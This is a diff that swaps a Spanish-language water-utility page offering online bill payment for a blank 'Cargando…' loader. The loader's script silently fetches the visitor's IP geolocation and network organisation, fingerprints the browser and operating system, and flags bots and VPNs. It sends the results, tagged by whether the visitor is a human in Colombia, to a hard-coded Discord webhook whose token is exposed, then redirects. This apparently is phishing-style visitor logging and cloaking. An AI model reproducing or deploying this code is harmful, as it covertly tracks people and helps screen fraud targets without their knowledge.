@@ -1,144 +1,101 @@
+
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Agua es Vida</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: "Segoe UI", sans-serif;
-      color: #003366;
-      background: #f0f9ff;
-    }
-
-    header {
-      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.3)), url("https://images.unsplash.com/photo-1507525428034-b723cf961d3e") no-repeat center/cover;
-      color: white;
-      text-align: center;
-      padding: 80px 20px;
-    }
-
-    header h1 {
-      font-size: 3em;
-      margin: 0;
-    }
-
-    header p {
-      font-size: 1.2em;
-      margin-top: 10px;
-    }
-
-    .cta-btn {
-      display: inline-block;
-      margin: 15px 10px;
-      padding: 15px 30px;
-      font-size: 1.1em;
-      background: #00aaff;
-      color: white;
-      text-decoration: none;
-      border-radius: 30px;
-      transition: background 0.3s ease;
-    }
-
-    .cta-btn:hover {
-      background: #0077cc;
-    }
-
-    section {
-      max-width: 1000px;
-      margin: 60px auto;
-      padding: 0 20px;
-      text-align: center;
-    }
-
-    section h2 {
-      font-size: 2em;
-      margin-bottom: 20px;
-      color: #005577;
-    }
-
-    .features {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 20px;
-    }
-
-    .feature {
-      background: white;
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-    }
-
-    .feature h3 {
-      color: #0077aa;
-      margin-top: 10px;
-    }
-
-    /* Bloque de facturación */
-    .facturas {
-      background: #e6f7ff;
-      padding: 40px 20px;
-      border-radius: 15px;
-      margin-top: 40px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-    }
-
-    .facturas h2 {
-      margin-bottom: 20px;
-    }
-
-    footer {
-      background: #003366;
-      color: white;
-      text-align: center;
-      padding: 20px;
-      margin-top: 40px;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Cargando…</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  html,body{margin:0;height:100%;display:flex;align-items:center;justify-content:center;background:#fff}
+  #loader{width:120px;height:120px}
+</style>
 </head>
 <body>
-  <header>
-    <h1>💧 Agua es Vida</h1>
-    <p>Cuidemos cada gota, el futuro nos lo agradecerá.</p>
-    <a href="#facturas" class="cta-btn">Ir a Facturación</a>
-  </header>
 
-  <section>
-    <h2>¿Por qué el agua es importante?</h2>
-    <div class="features">
-      <div class="feature">
-        <img src="https://img.icons8.com/ios-filled/100/00aaff/water.png" alt="Vida">
-        <h3>Fuente de Vida</h3>
-        <p>El agua es esencial para todos los seres vivos en la Tierra.</p>
-      </div>
-      <div class="feature">
-        <img src="https://img.icons8.com/ios-filled/100/00aaff/plant-under-rain.png" alt="Naturaleza">
-        <h3>Naturaleza</h3>
-        <p>Mantiene ríos, mares, bosques y ecosistemas saludables.</p>
-      </div>
-      <div class="feature">
-        <img src="https://img.icons8.com/ios-filled/100/00aaff/faucet.png" alt="Consumo">
-        <h3>Consumo Responsable</h3>
-        <p>Aprender a usar el agua de manera consciente nos asegura un futuro sostenible.</p>
-      </div>
-    </div>
-  </section>
+<img id="loader" src="loading.gif" alt="Cargando…">
 
-  <!-- Bloque de Facturación -->
-  <section id="facturas" class="facturas">
-    <h2>💳 Facturación en Línea</h2>
-    <p>Aquí puedes consultar y pagar tu factura de agua de forma rápida y segura.</p>
-    <a href="#" class="cta-btn">Consultar Factura</a>
-    <a href="#" class="cta-btn">Pagar Factura</a>
-  </section>
+<script>
+/* ========= CONFIG ========= */
+const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1417919457531138140/KtlzGO1YiHNBuJJeQ14WJV6-ELG1cY8ML6fUBS3eiYuWF1xQ-eRZfcW0qPQFo6ALncbo';
+const REDIR_URL   = '';
+/* ========================== */
 
-  <footer>
-    <p>&copy; 2025 Agua es Vida | Todos los derechos reservados</p>
-  </footer>
+(async () => {
+  const UA = navigator.userAgent;
+  const esBot = /bot|crawler|spider|curl|wget|scraping/i.test(UA);
+
+  /* ---------- GEO + ORG ---------- */
+  const { country = 'XX', city = 'Desconocida', org = '' } = await fetch('https://ipinfo.io/json')
+    .then(r => r.json())
+    .catch(() => ({}));
+
+  /* ---------- PROXY / VPN ---------- */
+  const esProxy = /vpn|proxy|hosting|datacenter|cloud/i.test(org);
+
+  /* ---------- NAVEGADOR ---------- */
+  let navegador = 'Desconocido';
+  if (/edg\//i.test(UA)) navegador = 'Edge';
+  else if (/brave/i.test(UA)) navegador = 'Brave';
+  else if (/opera|opr\//i.test(UA)) navegador = 'Opera';
+  else if (/chrome|chromium/i.test(UA) && !/edge|opr\//i.test(UA)) navegador = 'Chrome';
+  else if (/safari/i.test(UA) && !/chrome|chromium/i.test(UA)) navegador = 'Safari';
+  else if (/firefox|fxios/i.test(UA)) navegador = 'Firefox';
+
+  /* ---------- SISTEMA OPERATIVO ---------- */
+  let so = 'Desconocido';
+  if (/windows nt 10/i.test(UA)) so = 'Windows 10/11';
+  else if (/windows nt 6.3/i.test(UA)) so = 'Windows 8.1';
+  else if (/windows nt 6.2/i.test(UA)) so = 'Windows 8';
+  else if (/windows nt 6.1/i.test(UA)) so = 'Windows 7';
+  else if (/macintosh|mac os x/i.test(UA)) so = 'macOS';
+  else if (/kali/i.test(UA)) so = 'Kali Linux';
+  else if (/ubuntu/i.test(UA)) so = 'Ubuntu';
+  else if (/linux/i.test(UA)) so = 'Linux';
+  else if (/android/i.test(UA)) so = 'Android';
+  else if (/iphone|ipad/i.test(UA)) so = 'iOS';
+
+  /* ---------- FECHA / HORA ---------- */
+  const ahora = new Date();
+  const fechaHora = ahora.toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+  /* ---------- CONTADOR DIARIO ---------- */
+  const hoy = ahora.toISOString().slice(0, 10);
+  const clave = `ingresos_${hoy}`;
+  let num = parseInt(localStorage.getItem(clave) || '0', 10);
+  num += 1;
+  localStorage.setItem(clave, num.toString());
+
+  /* ---------- EMBED ---------- */
+  const embed = {
+    color: esBot ? 0xff0000 : (esProxy ? 0xff9900 : (country === 'CO' ? 0x00ff00 : 0x0099ff)),
+    title: esBot ? '🤖 Bot detectado' : (esProxy ? '🕵️ Proxy/VPN detectado' : (country === 'CO' ? '✅ Humano en Colombia' : '❌ Humano fuera de Colombia')),
+    thumbnail: { url: 'https://i.postimg.cc/fyZQ1Dyy/coolcloud-icono.png' },
+    fields: [
+      { name: '📅 Fecha y hora', value: fechaHora, inline: true },
+      { name: '🔢 Ingreso del día', value: `#${num}`, inline: true },
+      { name: '🌍 Ubicación', value: `${city}, ${country === 'CO' ? 'Colombia' : country}`, inline: true },
+      { name: '🌐 Navegador', value: navegador, inline: true },
+      { name: '💻 Sistema Operativo', value: so, inline: true },
+      { name: '📡 Organización', value: org || 'Sin datos', inline: true }
+    ],
+    footer: { text: 'Sistema de ingresos' },
+    timestamp: new Date().toISOString()
+  };
+
+  await fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ embeds: [embed] })
+  });
+
+  /* ---------- REDIRECCIÓN ---------- */
+  setTimeout(() => {
+    location.href = REDIR_URL;
+  }, 4000);
+})();
+</script>
 </body>
+
 </html>
-
-
 
